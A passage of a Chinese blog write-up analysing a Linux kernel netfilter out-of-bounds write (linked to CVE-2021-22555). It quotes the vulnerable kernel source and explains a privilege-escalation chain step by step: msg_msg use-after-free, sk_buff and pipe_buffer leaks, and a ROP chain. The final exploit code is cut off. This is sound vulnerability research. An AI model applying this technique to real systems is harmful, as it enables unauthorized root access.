class="hljs-type">int</span> val,</span><br><span class="hljs-params">     <span class="hljs-type">char</span> __user *opt, <span class="hljs-type">int</span> *len, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ops = nf_sockopt_find(sk, pf, val, get);<br><span class="hljs-keyword">if</span> (IS_ERR(ops))<br><span class="hljs-keyword">return</span> PTR_ERR(ops);<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;compat_get)<br>ret = ops-&gt;compat_get(sk, val, opt, len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;get(sk, val, opt, len);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;compat_set)<br>ret = ops-&gt;compat_set(sk, val, opt, *len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;<span class="hljs-built_in">set</span>(sk, val, opt, *len);<br>&#125;<br><br>module_put(ops-&gt;owner);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么具体调用到哪个函数？在 <code>nf_sockopt_find</code> 中使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>compat_ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_sockopt_ops *<span class="hljs-title function_">nf_sockopt_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf,</span><br><span class="hljs-params"><span class="hljs-type">int</span> val, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><br>mutex_lock(&amp;nf_sockopt_mutex);<br>list_for_each_entry(ops, &amp;nf_sockopts, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;pf == pf) &#123;<br><span class="hljs-keyword">if</span> (!try_module_get(ops-&gt;owner))<br><span class="hljs-keyword">goto</span> out_nosup;<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;<br>val &lt; ops-&gt;get_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;<br>val &lt; ops-&gt;set_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>module_put(ops-&gt;owner);<br>&#125;<br>&#125;<br>out_nosup:<br>ops = ERR_PTR(-ENOPROTOOPT);<br>out:<br>mutex_unlock(&amp;nf_sockopt_mutex);<br><span class="hljs-keyword">return</span> ops;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">ip_tables_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Register setsockopt */</span><br>ret = nf_register_sockopt(&amp;ipt_sockopts);<br></code></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>compat_do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> <span class="hljs-title">ipt_sockopts</span> =</span> &#123;<br>.pf= PF_INET,<br>.set_optmin= IPT_BASE_CTL,<br>.set_optmax= IPT_SO_SET_MAX+<span class="hljs-number">1</span>,<br>.<span class="hljs-built_in">set</span>= do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_set= compat_do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.get_optmin= IPT_BASE_CTL,<br>.get_optmax= IPT_SO_GET_MAX+<span class="hljs-number">1</span>,<br>.get= do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_get= compat_do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><h1>0x01.漏洞分析</h1><p>前面讲到 32 位程序的 setsockopt 系统调用最终会调用到 <code>compat_do_ipt_set_ctl()</code>，而漏洞便发生在当我们指定 optname 为 <code>IPT_SO_SET_REPLACE</code> 时，其最终会调用 <code>compat_do_replace()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">compat_do_ipt_set_ctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk,<span class="hljs-type">int</span> cmd, <span class="hljs-type">void</span> __user *user,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> IPT_SO_SET_REPLACE:<br>ret = compat_do_replace(sock_net(sk), user, len);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> IPT_SO_SET_ADD_COUNTERS:<br>ret = do_add_counters(sock_net(sk), user, len, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">default</span>:<br>ret = -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">compat_do_ipt_set_ctl()<br>    compat_do_replace()<br>    translate_compat_table()<br>    compat_copy_entry_from_user()<br>    xt_compat_match_from_user()<br>    xt_compat_target_from_user()<br></code></pre></td></tr></table></figure><p>这里提前说明：<strong>漏洞在</strong> <code>xt_compat_match_from_user()</code> <strong>与</strong> <code>xt_compat_target_from_user()</code> <strong>中都存在，逻辑相同</strong></p><p>我们先来看 <code>xt_compat_target_from_user()</code>，在这里会将 <code>t-&gt;data + target-&gt;targetsize</code> 起始的长度为 <code>pad</code> 的区域置 0：先将 targetsize 向上与 8 对齐，之后再减去 targetsize，剩下的这段自然就是分配的 object 减去 targetsize 后的剩余空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">xt_compat_target_from_user</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xt_entry_target *t, <span class="hljs-type">void</span> **dstptr,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *size)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_target</span> *<span class="hljs-title">target</span> =</span> t-&gt;u.kernel.target;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compat_xt_entry_target</span> *<span class="hljs-title">ct</span> =</span> (<span class="hljs-keyword">struct</span> compat_xt_entry_target *)t;<br><span class="hljs-type">int</span> pad, off = xt_compat_target_offset(target);<br><span class="hljs-type">u_int16_t</span> tsize = ct-&gt;u.user.target_size;<br><span class="hljs-type">char</span> name[<span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name)];<br><br>t = *dstptr;<br><span class="hljs-built_in">memcpy</span>(t, ct, <span class="hljs-keyword">sizeof</span>(*ct));<br><span class="hljs-keyword">if</span> (target-&gt;compat_from_user)<br>target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">memcpy</span>(t-&gt;data, ct-&gt;data, tsize - <span class="hljs-keyword">sizeof</span>(*ct));<br>pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;<br><span class="hljs-keyword">if</span> (pad &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="hljs-number">0</span>, pad);<span class="hljs-comment">// 漏洞产生点</span><br><br>tsize += off;<br>t-&gt;u.user.target_size = tsize;<br>strlcpy(name, target-&gt;name, <span class="hljs-keyword">sizeof</span>(name));<br>module_put(target-&gt;me);<br><span class="hljs-built_in">strncpy</span>(t-&gt;u.user.name, name, <span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name));<br><br>*size += off;<br>*dstptr += tsize;<br>&#125;<br>EXPORT_SYMBOL_GPL(xt_compat_target_from_user);<br></code></pre></td></tr></table></figure><p>理想情况下，应该是按照如下方式进行清零的，看起来好像没有什么问题？（下图例子中假设 targetsize 小于 8）</p><p><img src="https://s2.loli.net/2022/03/31/3jlPfpg2AMYoZrv.png" alt="image.png"></p><p><strong>但是 t-&gt;data 并不一定是 8 字节对齐的，而我们计算 pad 时却默认 t-&gt;data 应当 8 字节对齐</strong>，因此若 t-&gt;data 并非 8 字节对齐，而 pad 计算时向上与 8  字节对齐，<strong>就会导致越界写入数字节的 0 到相邻的下一个 object 中</strong></p><p><img src="https://s2.loli.net/2022/03/31/eS15WvRZuz8f6HU.png" alt="image.png"></p><p>这里笔者对公开的 exp 进行调试，可以看到的是 t-&gt;data <strong>确乎可以为一个非 8 字节对齐的地址，而此时 target-&gt;targetsize 再向上对 8 字节对齐，自然就会越界写到相邻下一 object 的开头</strong></p><p><img src="https://s2.loli.net/2022/03/31/NBqKxZEDsOmgc64.png" alt="image.png"></p><p>在 <code>xt_compat_match_from_user()</code> 中产生的漏洞逻辑相同，这里就不赘叙了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">xt_compat_match_from_user</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> xt_entry_match *m, <span class="hljs-type">void</span> **dstptr,</span><br><span class="hljs-params">       <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *size)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_match</span> *<span class="hljs-title">match</span> =</span> m-&gt;u.kernel.match;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compat_xt_entry_match</span> *<span class="hljs-title">cm</span> =</span> (<span class="hljs-keyword">struct</span> compat_xt_entry_match *)m;<br><span class="hljs-type">int</span> pad, off = xt_compat_match_offset(match);<br><span class="hljs-type">u_int16_t</span> msize = cm-&gt;u.user.match_size;<br><span class="hljs-type">char</span> name[<span class="hljs-keyword">sizeof</span>(m-&gt;u.user.name)];<br><br>m = *dstptr;<br><span class="hljs-built_in">memcpy</span>(m, cm, <span class="hljs-keyword">sizeof</span>(*cm));<br><span class="hljs-keyword">if</span> (match-&gt;compat_from_user)<br>match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">memcpy</span>(m-&gt;data, cm-&gt;data, msize - <span class="hljs-keyword">sizeof</span>(*cm));<br>pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;<br><span class="hljs-keyword">if</span> (pad &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memset</span>(m-&gt;data + match-&gt;matchsize, <span class="hljs-number">0</span>, pad); <span class="hljs-comment">// 漏洞产生点</span><br><br>msize += off;<br>m-&gt;u.user.match_size = msize;<br>strlcpy(name, match-&gt;name, <span class="hljs-keyword">sizeof</span>(name));<br>module_put(match-&gt;me);<br><span class="hljs-built_in">strncpy</span>(m-&gt;u.user.name, name, <span class="hljs-keyword">sizeof</span>(m-&gt;u.user.name));<br><br>*size += off;<br>*dstptr += msize;<br>&#125;<br>EXPORT_SYMBOL_GPL(xt_compat_match_from_user);<br></code></pre></td></tr></table></figure><h1>0x02.漏洞利用</h1><p>接下来我们来考虑如何利用这个越界写 0 的漏洞，现在公开的这一份 exp 利用 <code>msg_msg</code> 构造 UAF、利用 <code>sk_buff</code> 写入 object、利用 <code>pipe_buffer</code> 劫持 RIP，笔者认为这是一个很好的思路，所以后面笔者构造 exp 也会遵循同样的思路完成</p><blockquote><p>下面的图例大部分来自 <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">Google 的 security research 博客</a>，非常感谢 Google 做出了如此简单易懂的图例！</p></blockquote><h2 id="提权">提权</h2><h3 id="Step-O-开始前的准备工作">Step.O 开始前的准备工作</h3><p>为了触发到漏洞的路径，我们应当使用 <code>unshare()</code> 隔离出对应的的命名空间，同时为了提高堆喷的稳定性，我们将进程绑定到固定核心上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>    errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br><span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>    errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>CPU_ZERO(&amp;cpu_set);<br>CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br></code></pre></td></tr></table></figure><blockquote><p>如果不隔离出独立命名空间的话<strong>便不会走到触发漏洞的路径</strong>，因为我们需要 <code>CAP_SYS_ADMIN</code> 权限，作为普通用户只能通过命名空间隔离进行获取</p></blockquote><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息">Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上 off-by-one，我们该怎么利用呢？比较朴素的一种思想便是覆写一个头部为指针的结构体，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 0x1000，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息，再利用 setsockopt 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/03/31/cJjVS59m8nvI4e2.png" alt="image.png"></p><p>这样就会导致 <code>xt_table_info</code> 结构体覆写到其相邻的主消息的 next 指针，从而导致<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong></p><p><img src="https://s2.loli.net/2022/03/31/vOMedQBuFsiKlYD.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF">Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/03/31/nbw6aSFXIVEtDN4.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址">Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，<strong>我们不难想到的是</strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/03/31/CxE24knZqyXPgHj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址">Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权">Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/03/31/RW6HFoLJf1AE5kd.png" alt="image.png"></p><h3 id="Final-EXPLOIT">Final EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 